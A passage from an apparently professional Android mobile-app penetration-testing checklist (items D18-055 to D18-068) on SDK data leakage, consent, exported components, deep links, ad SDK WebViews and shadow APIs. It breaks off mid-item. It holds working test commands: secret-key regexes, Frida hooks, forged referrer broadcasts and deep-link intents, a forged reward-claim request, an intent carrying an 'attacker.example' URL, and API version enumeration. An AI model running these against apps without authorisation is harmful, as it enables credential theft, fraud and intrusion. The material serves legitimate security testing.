| **VRT** | `cryptographic_weakness.key_reuse.inter_environment` (P2) |
| **Attacker** | AM-01 |
| **Applies to** | Apps shipping build flavours, or where a debug/staging APK is publicly obtainable |
| **Requires** | — |
| **Maps to** | `developer.android.com/privacy-and-security/security-tips` — separate keys per environment and per app, restrict by IP/app certificate, prefer OAuth 2.0 scoping, rotate every 90 days to 6 months |

- **Test:** Compare the credentials in the release build against those in any debug, staging, beta or internal-track build you can legitimately obtain. A shared key means the weaker environment's exposure is the production environment's exposure.
- **How:**
```bash
for v in release staging debug; do
  apktool d -f apks/$v.apk -o decomp/$v >/dev/null 2>&1
  grep -rhoE 'AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|sk_(live|test)_[A-Za-z0-9]{16,}|da2-[a-z0-9]{26}' decomp/$v | sort -u > keys.$v
  echo "$v: $(wc -l < keys.$v) keys"
done
comm -12 keys.release keys.staging
comm -12 keys.release keys.debug
grep -rn 'BuildConfig\.' $S/ | grep -iE 'api_key|secret|base_url|endpoint|environment' | head -20
```
  Also check the reverse direction: a staging *endpoint* reachable with the production key (D18-012's service sweep against the staging host).
- **Proof:** The identical key value present in both builds, with `file:line` for each, and one successful authenticated call showing the shared key reaching production.
- **Escalation:** The staging backend is usually the weaker one — this is the bridge into D18-068's shadow-API work and into -> D15.
- **Ruled out when:** The key sets are disjoint (`comm -12` empty for every pair), or only one build exists within scope. State which.

### D18-056 · Static inventory of SDK APIs known to handle sensitive user data

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) once paired with the runtime item; the static inventory alone is P5 |
| **Attacker** | AM-08 |
| **Applies to** | All |
| **Requires** | — |
| **Maps to** | MASTG-TEST-0318 (References to SDK APIs Known to Handle Sensitive User Data), MASWE-0073, MASTG-KNOW-0026 (Third-party Services Embedded in the App); MASTG-TEST-0004 is its deprecated v1 predecessor |

- **Test:** Identify every third-party SDK and, for each, the specific entry-point methods through which app data flows into the vendor. MASTG's prerequisite is to read the SDK's own documentation to learn those methods. MASTG states explicitly that this test detects only **potential** sensitive-data handling — on its own it is Informational.
- **How:**
```bash
unzip -l target.apk | grep -oE "(com|io|net|org)/[a-z0-9_/]+" | cut -d/ -f1-3 | sort -u | head -60
grep -rn "com.google.firebase\|com.facebook\|com.amplitude\|com.mixpanel\|com.appsflyer\|io.branch\|com.adjust\|com.segment\|com.braze\|com.clevertap\|io.sentry\|com.bugsnag\|com.crashlytics" $S/ | cut -d: -f1 | sort -u
grep -rnE 'FirebaseAnalytics|setUserId\(|setUserProperty\(|logEvent\(|identify\(|setCustomKey\(|setUserIdentifier\(|leaveBreadcrumb\(|track\(' $S/
```
- **Proof:** The call sites passing user data into `setUserId` / `setUserProperty` / `logEvent` and their SDK equivalents, with `file:line`.
- **Escalation:** Feeds D18-057 (the actual finding) and the -> D20 privacy-declaration comparison. Becomes Medium/High only when paired with the runtime capture and an undeclared-collection finding.
- **Ruled out when:** The app bundles no analytics, attribution, crash or advertising SDK — the package prefix sweep above returns only first-party and UI libraries. List them.

### D18-057 · Runtime capture of the argument values SDK entry points receive

| | |
|---|---|
| **Severity ceiling** | High (Critical when a session token or document content reaches a third party) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES, CWE-200); Critical under HackerOne's PII standard for multi-user sensitive PII |
| **Attacker** | AM-08 |
| **Applies to** | All |
| **Requires** | device, frida, mitm |
| **Maps to** | MASTG-TEST-0319 (Runtime Use of SDK APIs Known to Handle Sensitive User Data), MASWE-0073, MASTG-TECH-0043, MASTG-TECH-0033, MASTG-TECH-0100; MASVS-PRIVACY-1/-3; Mobile Top 10 2024 M6; ATT&CK T1533, T1532, T1646 |

- **Test:** Hook the entry points found in D18-056 and capture the **argument values** plus a stack trace while exercising the app. Argument values are what turns "potential" into a finding.
- **How:**
```bash
SERIAL=emulator-5554   # `-U` picks a device silently when several are attached; -D <serial> is mandatory in this harness
frida -D "$SERIAL" -f com.target.app -l sdk_hooks.js -q -t 600 | tee sdk-hooks.log   # spawn resumes by default on frida-tools 17; without -t the session detaches right after script load and every hook shows zero hits
```
```javascript
console.log('[hooks-loaded] ' + Java.available);   // positive control: a log without this line is a detached session, not a negative
Java.perform(function () {
  var Log = Java.use('android.util.Log'), Ex = Java.use('java.lang.Exception');
  function trace(){ return Log.getStackTraceString(Ex.$new()).split('\n').slice(1,6).join(' | '); }
  var FA = Java.use('com.google.firebase.analytics.FirebaseAnalytics');
  FA.setUserId.implementation = function (id) { console.log('[FA.setUserId] ' + id + '\n  ' + trace()); return this.setUserId(id); };
  FA.setUserProperty.implementation = function (k, v) { console.log('[FA.setUserProperty] ' + k + '=' + v + '\n  ' + trace()); return this.setUserProperty(k, v); };
  FA.logEvent.implementation = function (n, b) { console.log('[FA.logEvent] ' + n + ' ' + (b ? b.toString() : '') + '\n  ' + trace()); return this.logEvent(n, b); };
  // attribute every outbound request to its calling SDK: newCall() is the choke point for both execute() and enqueue()
  // (okhttp3.RealCall exists only in OkHttp 3.x; 4/5 keep it internal, and hooking execute() misses the async path every SDK uses)
  try {
    var Client = Java.use('okhttp3.OkHttpClient');
    Client.newCall.implementation = function (req) { console.log('[http] ' + req.url().toString() + '\n  ' + trace()); return this.newCall(req); };
  } catch (e) { console.log('[http] okhttp3.OkHttpClient not found — renamed under R8 or not OkHttp; resolve the class via the D18-008 anchors: ' + e); }
});
```
```bash
frida-trace -D "$SERIAL" -p "$(adb -s "$SERIAL" shell pidof com.target.app)" \
  -j '*analytics*!*/iu' -j '*firebase*!log*/i' -j '*appsflyer*!*/i' -o sdk.log
```
- **Proof:** A hook log line showing real PII or credential material handed to a third-party SDK method, with the stack trace naming the app class that supplied it, **and** the corresponding outbound request to the vendor host captured in the proxy. Both halves — the hook without the wire capture is weaker. A log with no `[hooks-loaded]` line is a detached session, not a negative. Decode the body per D18-058 before claiming which app or field was transmitted.
- **Escalation:** Combine with MASTG-TEST-0206 (undeclared PII on the wire) for the reportable "collects and shares X without declaring it" finding -> D20. If the exfiltrated field is an auth token, refile it as theft of sensitive data rather than privacy — at most vendors that is a materially higher band (Xiaomi, for example, runs a separate privacy table at High $500–$200 / Medium $200–$100 / Low $100–$50, well below its mobile security bands).
- **Ruled out when:** The captured arguments are pseudonymous install identifiers and screen names only, with no email, phone, account id joined to an advertising id, precise location, health/financial attribute or token — across a full feature sweep including login, payment and KYC. Name the flows you drove.

### D18-058 · SDK transmission before consent, or after consent is declined

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (varies); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) for the data itself |
| **Attacker** | AM-08 |
| **Applies to** | Apps serving EU/California users, or any app with a published privacy policy |
| **Requires** | device, mitm |
| **Maps to** | MASWE-0078 (Inadequate or Ambiguous User Consent Mechanisms, CWE-358/CWE-359), MASWE-0073, MASVS-PRIVACY-1 (requires "enforcing that third-party SDKs operate based on user consent, not by default or without it" and preventing SDKs "from ignoring consent signals or from collecting data before consent is confirmed"), MASVS-PRIVACY-4; Mobile Top 10 2024 M6 |

- **Test:** Clean install, proxy attached before first launch, decline or ignore every consent prompt, then inspect what already left the device.
- **How:**
```bash
adb uninstall com.target.app; adb install target.apk
mitmdump -w first_run.flows &
adb shell monkey -p com.target.app -c android.intent.category.LAUNCHER 1
# ... decline every consent dialog, then stop the capture
cat > first_run_hosts.py <<'PY'
def response(f):
    print(f.request.timestamp_start, f.request.pretty_host, f.request.path[:80])
PY
mitmdump -nr first_run.flows -s first_run_hosts.py --set flow_detail=0 > first_run_hosts.txt; wc -l first_run_hosts.txt   # -s needs a real file; `-q | grep` prints no flow lines at all
# which of those hosts are third-party?
grep -iE 'appsflyer|adjust|branch|amplitude|mixpanel|segment|facebook|onesignal|sentry|bugsnag|crashlytics|doubleclick|applovin|unity3d' first_run_hosts.txt | sort -u
# analytics uploads are gzip + protobuf; the host does not attribute them to THIS app on a shared device — decode the body and read the app id / installation id / user properties
cat > decode_uploads.py <<'PY'
import gzip, subprocess, urllib.parse
from mitmproxy import http
HOSTS = ('app-measurement.com', 'google-analytics.com', 'analytics.google.com', 'firebaseinstallations.googleapis.com')
def response(f: http.HTTPFlow):
    if not f.request.pretty_host.endswith(HOSTS): return
    b = f.request.raw_content or b''
    if b[:2] == b'\x1f\x8b': b = gzip.decompress(b)
    print(f.request.timestamp_start, f.request.pretty_host, f.request.path[:60])
    if b[:1] in (b'v', b'{') or b'=' in b[:40]:
        print(urllib.parse.parse_qs(b.decode('utf-8', 'replace'))); return        # GA4 /g/collect and /batch are key=value
    print(subprocess.run(['protoc', '--decode_raw'], input=b, capture_output=True).stdout.decode('utf-8', 'replace')[:1500])
PY
mitmdump -nr first_run.flows -s decode_uploads.py --set flow_detail=0
```
  The `1:<sender>:android:<hash>` app id, the Firebase installation id and the `user_property` / `event` records are the attribution; a `firebase_id` / `cid` that matches the device's own install (`files/PersistedInstallation.*.json`) proves the upload is this app's.
  Note the API-level gate for the harness: **targetSdk < 24** trusts user-added CAs, so a user CA suffices; at targetSdk 24+ you need a `network_security_config` override or a system CA, and on **API 34+** the trust store moved to the Conscrypt APEX so `/system/etc/security/cacerts` is ignored at runtime. AM-07 is tester convenience, not an attacker model — say so in the report.
- **Proof:** Requests to analytics, attribution or ad hosts carrying a device identifier or PII, **timestamped before** the consent dialog was accepted or after it was declined. The timestamps are the evidence; a host list is not.
- **Escalation:** -> D20; MASVS-PRIVACY-4 additionally requires re-prompting and updated disclosures when the app collects more than originally specified, so check version over version. This is the form that carries regulatory weight, which is why programs pay for it.
- **Ruled out when:** No third-party host receives anything other than a configuration fetch before consent, and every identifier-bearing request appears only after acceptance. Show the ordered host/timestamp list for both runs.

### D18-059 · Session-replay SDK capturing screens the app believes are masked

| | |
|---|---|
| **Severity ceiling** | High (Critical if the vendor console exposes multiple users' sessions and you can show it) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
| **Attacker** | AM-08 |
| **Applies to** | Apps embedding UXCam, Smartlook, Clarity, FullStory, Glassbox, Contentsquare, Quantum Metric, LogRocket or similar |
| **Requires** | device, mitm |
| **Maps to** | MASWE-0069 (Usage of Non-Privacy-Preserving Functionality); MASVS-PRIVACY-1 |

- **Test:** Masking in these SDKs is opt-in per view. They routinely capture card numbers, CVVs, OTPs, recovery codes and document scans — including on screens the app excludes from screenshots with `FLAG_SECURE`, because the SDK reads the view hierarchy rather than the framebuffer.
- **How:**
```bash
grep -rniE 'uxcam|smartlook|clarity|fullstory|glassbox|contentsquare|quantummetric|logrocket|sessionreplay' $S/ $MF
grep -rniE 'occludeSensitiveView|setSensitive|markSensitive|hideSensitive|maskView|maskAllInputs|addPrivateView|privateView|FS\.privacy|setPrivate' $S/
# capture the upload while typing canaries
mitmdump -s dump.py -q '~u uxcam|smartlook|clarity|fullstory|quantummetric'
```
  Type a distinct 8+ character canary into every sensitive field (a test PAN, a test OTP), then search the uploaded payload for each canary. Decompress the body in the proxy before searching.
- **Proof:** The vendor dashboard replay, or the captured upload payload, showing the typed value — screenshot the replay with the value visible, next to the app screen it came from. The canary search is what makes this deterministic rather than impressionistic.
- **Escalation:** Cardholder data and authentication codes leaving to a third party in replayable form; report it as a PCI/PII exposure with the replay as the artefact, and ask about the vendor console's own access control (often a separate in-scope asset).
- **Ruled out when:** Every sensitive view is registered with the SDK's masking API (show the call sites) **and** each canary is absent from the decompressed upload payload. Grep the payload for the canary; do not rely on the replay looking masked.

### D18-060 · Crash reporter shipping logcat, breadcrumbs and request bodies off-device

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies); Critical if an auth token is included, refiled as theft of sensitive data |
| **Attacker** | AM-08 |
| **Applies to** | Apps with Crashlytics, Sentry, Bugsnag, Instabug, AppCenter or Datadog |
| **Requires** | device, mitm |
| **Maps to** | `developer.android.com/privacy-and-security/risks/log-info-disclosure`; MASTG-TECH-0100; MASWE-0073 |

- **Test:** This is the item that converts a D20 logcat observation — whose severity is capped by on-device reachability — into a real cross-boundary leak, because the crash reporter carries the log off the device to a third party. Check the reporter's configuration and read an actual uploaded report.
- **How:**
```bash
grep -rniE 'Crashlytics|Sentry|Bugsnag|Instabug|AppCenter|Datadog|setCustomKey|setUserIdentifier|leaveBreadcrumb|recordException|beforeSend|attachLogs|setTag|addAttachment' $S/ -A4
grep -rn 'HttpLoggingInterceptor\|Level\.BODY\|Level\.HEADERS' $S/
# force a crash and capture the upload
adb logcat -c
adb shell am crash com.target.app 2>/dev/null                                            # stock device
adb -s emulator-5554 shell "su 0 sh -c 'kill -11 $(pidof com.target.app)'"               # rooted AVD fallback; run-as kill needs a debuggable package
# then in the proxy, decompress and search the outgoing report
```
- **Proof:** The outgoing crash/report payload containing the session token, an email, a PAN or a full request body, with the vendor host visible. `HttpLoggingInterceptor` left at `Level.BODY` in a release build is the classic supplier — it writes whole request and response bodies including `Authorization` headers to logcat, and the reporter then ships them.
- **Escalation:** -> D20. The severity distinction matters: logcat alone is capped by the reachability ceiling (who can read it — an app holding `READ_LOGS`, a preinstalled OEM logger); an SDK shipping the same content off-device removes that cap entirely.
- **Ruled out when:** `HttpLoggingInterceptor` is absent or gated on `BuildConfig.DEBUG` in the shipped build (show the guard), the reporter is configured with `beforeSend`/log-attachment disabled, and the captured upload contains no token or PII. Read one real upload; configuration alone is not the negative.

### D18-061 · Map the in-process capability of every bundled SDK (the peer-threat model)

| | |
|---|---|
| **Severity ceiling** | High (Medium where an SDK merely *can* reach the token; High where a captured flow shows it transmitting) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
| **Attacker** | AM-08 malicious third-party SDK |
| **Applies to** | All; weight it up for apps carrying session-replay, attribution, chat-support, ad or crash SDKs |
| **Requires** | device, frida, mitm |
| **Maps to** | AOSP security-model paper §4.3.4 — "libraries that are embedded by an app are considered to be within the app's security boundary"; the SDK Runtime (Android 13) is the only exception, giving ads SDKs "a secondary bound application sandbox with a separate UID", a separate SELinux policy and "a very limited set of permissions", and even there "there is no security boundary between SDKs for the same app"; `developer.android.com/privacy-and-security/risks/insecure-library` |

- **Test:** Every SDK in the APK runs with the app's UID, its permissions, its Keystore access and its network identity. The corpus covers how SDKs get compromised but rarely asks what a compromised one would reach. Enumerate the blast radius at runtime, not from the manifest.
- **How:**
```javascript
Java.perform(function () {
  var Log = Java.use('android.util.Log'), Ex = Java.use('java.lang.Exception');
  function foreign(){ return Log.getStackTraceString(Ex.$new()).split('\n')
      .filter(function(l){ return l.indexOf('com.target') < 0; }).slice(1,5).join(' | '); }
  var CI = Java.use('android.app.ContextImpl');
  CI.getSharedPreferences.overload('java.lang.String','int').implementation = function (n, m) {
    console.log('[prefs] ' + n + '  <- ' + foreign()); return this.getSharedPreferences(n, m); };
  var App = Java.use('android.app.Application');
  App.registerActivityLifecycleCallbacks.implementation = function (cb) {
    console.log('[lifecycle] ' + cb.$className); return this.registerActivityLifecycleCallbacks(cb); };
  try { var B = Java.use('okhttp3.OkHttpClient$Builder');
    B.addInterceptor.implementation = function (i) {
      console.log('[interceptor] ' + i.$className); return this.addInterceptor(i); }; } catch (e) {}
});
```
```bash
adb shell dumpsys package com.target.app | grep -i 'requested permissions' -A40
mitmdump -nr session.flow --set flow_detail=3 | grep -iE 'Authorization: Bearer|token=' | sort -u   # -q prints nothing; flow_detail>=2 prints headers
```
- **Proof:** A log line where a **non-first-party** class name reads the auth preferences file, registers lifecycle callbacks (screen access), or installs an HTTP interceptor (token access) — plus, ideally, a proxied flow to that vendor's domain carrying the token or a screen field.
- **Escalation:** -> D20 undisclosed third-party data sharing; -> D17 if any SDK loads remote code, at which point the SDK vendor's CDN becomes your AM-09 attacker. Treat every bundled SDK as in-process. The Android 13 SDK Runtime was the one documented exception, but the retirement of Privacy Sandbox on Android (SDK Runtime included) was announced in October 2025 — only a `<uses-sdk-library>` entry in the merged manifest (D18-066) shows an SDK actually loaded out-of-process, and even then there is no isolation between SDKs of the same app. Verify the current status before citing the exception.
- **Ruled out when:** No third-party class appears in the prefs/lifecycle/interceptor logs across a full feature sweep, and no non-first-party host receives a request carrying a token. Name the flows driven and the session length.

### D18-062 · Attribution SDK acting as a second, undocumented deep-link router

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) — rated on the route reached |
| **Attacker** | AM-02 remote, one click |
| **Applies to** | Apps bundling Branch, AppsFlyer, Adjust or a similar attribution SDK |
| **Requires** | deeplink, device |
| **Maps to** | `developer.android.com/privacy-and-security/risks/android-exported`; the Branch/AppsFlyer/Adjust deep-link manipulation class |

- **Test:** These SDKs register their own link handlers and accept a routing parameter in the attribution payload. That is a second router, sitting beside the app's own deep-link handling and usually bypassing its validation entirely.
- **How:**
```bash
grep -rn 'io.branch\|com.appsflyer\|com.adjust' $S/ | cut -d: -f1 | sort -u
grep -n -B4 -A14 'branch\|appsflyer\|adjust' $MF
# the device shell re-parses the argument string: quote the remote command once for the host and once for the device,
# or `$deeplink_path` expands to nothing and `&` backgrounds the command — the probe silently sends a different intent
adb shell "am start -a android.intent.action.VIEW -d 'https://<sub>.app.link/x?\$deeplink_path=pay/confirm&amount=1'"
adb shell "am start -a android.intent.action.VIEW -d 'targetapp://?af_dp=targetapp%3A%2F%2Fpay%2Fconfirm'"
adb shell "am start -a android.intent.action.VIEW -d 'targetapp://?adj_deeplink=targetapp%3A%2F%2Fadmin'"
```
- **Proof:** The app navigating to the internal route named in the attribution parameter, screen-recorded, with the launched activity confirmed via `adb shell dumpsys activity activities | grep -E 'ResumedActivity|topResumedActivity'`.
- **Escalation:** -> D09 deep links and -> D15 for whatever the route does; attribution fraud alone -> D23 rewarded-install payouts. Exported-by-default gate (below targetSdk 31): see D18-006 — it is how many of these handlers become reachable.
- **Ruled out when:** The SDK's deferred-deep-link callback passes through the app's own allow-list before routing (show the validation call site), and every crafted parameter lands on the app's fallback screen. Show the resumed activity for each attempt.

### D18-063 · Install-referrer / attribution receiver exported without a permission

| | |
|---|---|
| **Severity ceiling** | Medium (Low standalone; Medium–High where referrer data drives a reward or payout) |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
| **Attacker** | AM-03 zero-permission local app |
| **Applies to** | Apps with an `INSTALL_REFERRER` receiver |
| **Requires** | exported-receiver, device |
| **Maps to** | `developer.android.com/privacy-and-security/risks/android-exported`, `.../access-control-to-exported-components` |

- **Test:** Attribution receivers exported with no guarding permission let any installed app forge attribution data.
- **How:**
```bash
grep -n -B4 -A8 'INSTALL_REFERRER' $MF
adb shell "am broadcast -n com.target.app/<receiver> -a com.android.vending.INSTALL_REFERRER --es referrer 'utm_source=zx83qp4r&utm_campaign=zx83qp4r'"   # & and = must reach am, not the device sh; marker per D18-070 (no 'attacker')
# did it persist? run-as needs a debuggable package: read the sandbox on the rooted AVD
adb -s emulator-5554 shell "su 0 sh -c 'grep -il \"referrer\|utm\" /data/data/com.target.app/shared_prefs/*.xml'"
```
- **Proof:** The forged referrer persisted in the app's storage, or echoed in an outbound analytics request captured in the proxy. Use a random marker in the referrer so you can prove the value is yours.
- **Escalation:** -> D23 if the referrer influences a referral bonus, coupon or partner payout; that is what moves it out of Low.
- **Ruled out when:** The receiver is not exported, or it is guarded by `com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE` / a signature permission, or the forged broadcast is discarded (the marker appears nowhere in storage or on the wire). Show the storage grep.

### D18-064 · Ad SDK WebView settings and client-side rewarded-ad completion

| | |
|---|---|
| **Severity ceiling** | High (ad content reaching a bridge or `file://`); Medium for reward fraud |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) for the bridge reach; `broken_access_control.privilege_escalation` (varies) for the reward |
| **Attacker** | AM-09 malicious backend/CDN (the ad network or a mediation partner) for the content half; AM-05 for the reward half |
| **Applies to** | Ad-supported apps |
| **Requires** | ads-sdk, device |
| **Maps to** | Google ASI campaigns naming specific ad SDKs ("Supersonic Ad SDK", "Vpon Ad SDK", "Airpush Ad SDK", "MoPub Ad SDK", "AdMarvel", "Vungle Ad SDK", "Vitamio Ad SDK"); ATT&CK T1474.001 |

- **Test:** Ad SDKs render remote HTML in WebViews inside the app's process. Two questions: does the ad WebView have file/content access or an injected bridge, and is rewarded-ad completion verified server-side.
- **How:**
```bash
grep -rn 'com.google.android.gms.ads\|AdMob\|applovin\|ironsource\|vungle\|chartboost\|inmobi\|com.unity3d.ads\|mopub\|smaato\|fyber' $S/ | cut -d: -f1 | sort -u
grep -rnE 'setAllowFileAccess\(true\)|setAllowFileAccessFromFileURLs\(true\)|setAllowUniversalAccessFromFileURLs\(true\)|setAllowContentAccess\(true\)|addJavascriptInterface|setMixedContentMode' $S/ \
  | grep -iE 'ad|mraid|vast|creative'
grep -rnE 'onUserEarnedReward|onRewardedVideoCompleted|grantReward|rewardUser' $S/
# does the reward land on a client call?
curl -s -i -X POST https://api.target/v1/rewards/claim -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' -d '{"ad_unit":"<id>","completed":true}' | head -10
```
  Check whether creatives load over HTTP: below **targetSdk 28** cleartext is permitted by default, which makes AM-06 creative injection realistic without any CA work.
- **Proof:** Ad content executing script that reaches a `file://` read or an app bridge method (show `Object.keys(window)` plus one method's return value), or a reward balance incremented after a forged client-side completion with no ad served — use the five-screenshot state-change pattern for the reward case.
- **Escalation:** -> D10 (the ad WebView as an injection vector into the app's process), -> D23 (reward and offerwall fraud).
- **Ruled out when:** The ad WebView has file and content access disabled, no `addJavascriptInterface` on the ad view, creatives load over HTTPS only, **and** the reward is granted by the ad network's server-to-server callback (the forged client claim is rejected and the balance does not move).

### D18-065 · App Startup initialisers running before any authentication or consent gate

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (varies) for the egress; rate up where a pre-auth config fetch is a control-plane injection point |
| **Attacker** | AM-08; AM-09 for the config-fetch half |
| **Applies to** | Any app using AndroidX App Startup |
| **Requires** | device, mitm |
| **Maps to** | `developer.android.com/topic/libraries/app-startup` (initialisers declared as `<meta-data>` under `InitializationProvider`); MASWE-0069, MASWE-0078 |

- **Test:** Every `<meta-data android:value="androidx.startup" />` names an `Initializer` that runs in `InitializationProvider.onCreate()` — before the launcher activity, before any PIN or biometric gate, and before any consent screen. Audit what those initialisers do: fetch remote config, open a socket, read a token, register a listener, send telemetry carrying identifiers.
- **How:**
```bash
grep -nB2 -A4 'androidx.startup' $MF
for c in $(grep -oE 'android:name="[^"]*Initializer"' $MF | cut -d'"' -f2); do
  echo "== $c"; f=$(echo "$c" | tr '.' '/'); sed -n '1,80p' "$S/$f.java" 2>/dev/null \
    | grep -nE 'http|OkHttp|Retrofit|SharedPreferences|getString|Firebase|init\(|Socket'
done
adb shell am force-stop com.target.app && adb logcat -c
adb shell monkey -p com.target.app 1 ; adb logcat -d | head -100
```
  Watch the proxy for requests that fire before the first screen paints.
- **Proof:** A network request carrying device identifiers, or fetching a config the app then trusts, observed in the proxy **before** the app's lock screen is drawn. Timestamp it against the first frame.
- **Escalation:** Pre-auth, pre-consent egress is -> D20; a pre-auth *config fetch* that the app then trusts is a control-plane injection point -> D18-025 and, combined with backup/restore, -> D11.
- **Ruled out when:** Every declared initialiser only wires local dependencies — no HTTP client construction, no token read, no telemetry call — and the proxy shows nothing before the first screen. Quote the initialiser list.

### D18-066 · Permissions, foreground-service types and components the SDKs merged into the manifest

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) for a component; `privacy_concerns.unnecessary_data_collection` (varies) for a permission |
| **Attacker** | AM-03 for components; AM-08 for permissions and background execution |
| **Applies to** | All; the FGS-type half applies at targetSdk 34+ |
| **Requires** | — |
| **Maps to** | `developer.android.com/about/versions/13/behavior-changes-13` ("If SDKs declare this permission, it auto-merges into app manifest" — stated for `AD_ID`); `developer.android.com/develop/background-work/services/fgs/service-types`; `developer.android.com/about/versions/14/behavior-changes-14` (Play Console FGS type declaration) |

- **Test:** The app's effective attack surface is larger than its own code, and manifest merge is how. Review the **merged** manifest, not the source one: `AD_ID`, `QUERY_ALL_PACKAGES`, foreground-service types and `<uses-sdk-library>` arrive from AARs. Attribute each to a named dependency.
- **How:**
```bash
# take merged.xml and the attributed component table from D18-006 (same decompile, same merger report); add:
grep -n 'uses-permission' merged.xml | grep -iE 'AD_ID|QUERY_ALL_PACKAGES|PACKAGE_USAGE_STATS|READ_PHONE_STATE|ACCESS_BACKGROUND_LOCATION'
grep -n -B4 'foregroundServiceType' merged.xml
grep -n '<service' merged.xml | grep -v 'com.target.app'
grep -n -A6 'com.google.android.gms.metadata.ModuleDependencies' merged.xml
```
  The documented Photo Picker backport declaration is `android:enabled="false"`, `android:exported="false"` with a `photopicker_activity:0:required` meta-data — a deviation such as `exported="true"` means someone hand-edited it.
- **Proof:** The merger report attributing a dangerous permission, a `foregroundServiceType="dataSync"` or an exported component to a named third-party AAR. Without the build tree, the package-prefix attribution from D18-006 plus the SDK's published manifest is sufficient.
- **Escalation:** -> D03/D04/D05/D06 for the component; -> D20 for the permission and for persistent background execution granted to a third party inside the app's UID. Note the gates: below **targetSdk 30** package visibility is free, so `QUERY_ALL_PACKAGES` matters only at 30+; the exported-by-default gate (below targetSdk 31) is stated once in D18-006.
- **Ruled out when:** Every permission and FGS type in the merged manifest maps to a first-party feature you can name, and no third-party component is exported. Produce the attribution table, not a summary.

### D18-067 · SDK-declared exported component: prove ownership so the report is not closed as "third party"

| | |
|---|---|
| **Severity ceiling** | Critical (inherits the SDK defect's impact, rated against the host app) |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) — rated on what it exposes |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Requires** | device |
| **Maps to** | `developer.android.com/privacy-and-security/risks/android-exported`, `.../access-control-to-exported-components`; Oversecured's SDK research (its seven SDK vulnerability classes: intent redirection, WebView misconfiguration, insecure deep-link handlers, hardcoded secrets, insecure local storage, excessive permissions, cryptography failures); EngageLab EngageSDK ≤ v4.5.4 `MTCommonActivity` / `n_intent_uri` (Microsoft reported April 2025, fixed v5.2.1 on 2025-11-03; >50M installs; affected apps removed from Google Play); CVE-2020-8913 (Play Core); H1 #532836 / #1455987 (Exness, SurveyMonkey SDK), #258460 (Quora, gotev UploadService), #192886 (Mapbox SDK, Low, $1,000), #694053 (Lark, Medium, $1,000) |

- **Test:** These reports most often die as "third-party code, not ours". Pre-empt that by proving three things, in this order, in one evidence pack.
- **How:**
```bash
# 1) it ships in THIS app and is exported HERE
grep -nE 'exported="true"' $MF | grep -v 'com\.target\.'
# 2) it is reachable by a zero-permission app on a stock device (shell UID holds no app permissions)
adb shell am start -n com.target.app/com.vendor.sdk.SomeActivity --es u 'https://attacker.example/'
adb shell dumpsys window | grep mCurrentFocus
# 3) impact lands on THIS app's data — run-as needs a debuggable package; use the rooted AVD for the sandbox view, and on the
#    stock device prove impact by what comes BACK to the attacker (result Intent, returned URI, a request to your host)
adb -s emulator-5554 shell "su 0 sh -c 'ls -la /data/data/com.target.app/files /data/data/com.target.app/shared_prefs'"
# 4) record the SDK version and whether a fixed version exists
grep -rn 'versionName\|SDK_VERSION\|BuildConfig.VERSION' $S/com/vendor/
unzip -l target.apk | grep -iE 'META-INF/.*\.version'
```
- **Proof:** The three artefacts above together. Point 3 is the one that converts "report it upstream" into "your users are affected today" — show the file that moved, the token that returned, or the intent that was forwarded, inside the target app's own sandbox.
- **Escalation:** -> D06/D08/D10 for the sink reached. If a fixed SDK version exists, it is additionally a -> D02/D17 outdated-dependency finding with a concrete remediation, which raises the payout odds. Note in the report that the same check applies to every other app the client ships with that SDK — SDK bugs are fleet-wide.
- **Ruled out when:** Every non-first-party component is `exported="false"` without `grantUriPermissions`, or the exported ones are inert — launched from the shell UID they render a static screen and touch no app data (show the resumed activity and the unchanged sandbox listing from the rooted AVD). Exported-by-default gate (below targetSdk 31): see D18-006, and below **targetSdk 17** providers are exported by default.

### D18-068 · Shadow API: the backend host hardcoded in the app is an older version than the web client's

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where the old version accepts no token; `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) for a field-exposure regression |
| **Attacker** | AM-01 |
| **Applies to** | Any versioned API reached from the package, including the Remote Config and staging hosts found in D18-023 and D18-055 |
| **Requires** | backend-api |
| **Maps to** | API8:2023; the corpus names this "the highest-value mobile→backend bridge" |

- **Test:** A mobile app's hardcoded backend calls are frequently an **older** API version than the current web app uses, with weaker auth, weaker rate limits, weaker input validation and more field exposure. Diff **behaviourally** across versions for the same operation, not by response shape. A version difference alone is Informational; the weakened control is the finding.
- **How:**
```bash
# version and host enumeration, in Python with counting (never a shell array loop)
python3 - <<'PY'
import urllib.request, urllib.error
T = "api.target.example"
vers = ["v1","v2","v3","v4","beta","alpha","internal","legacy","old","2022-01-01","2023-01-01","2024-01-01"]
subs = ["api","api-v1","api-v2","apiv1","apiv2","legacy-api","old-api","internal-api","staging-api"]
live = 0
for v in vers:
    for u in (f"https://{T}/api/{v}/",):
        try:
            with urllib.request.urlopen(u, timeout=8) as r: code = r.status
        except urllib.error.HTTPError as e: code = e.code
        except Exception: code = None
        print(code, u)
        if code not in (404, None): live += 1
print("live:", live, "of", len(vers))
PY
curl -s -H 'X-API-Version: 1'                          "https://api.target.example/users" -o /dev/null -w '%{http_code}\n'
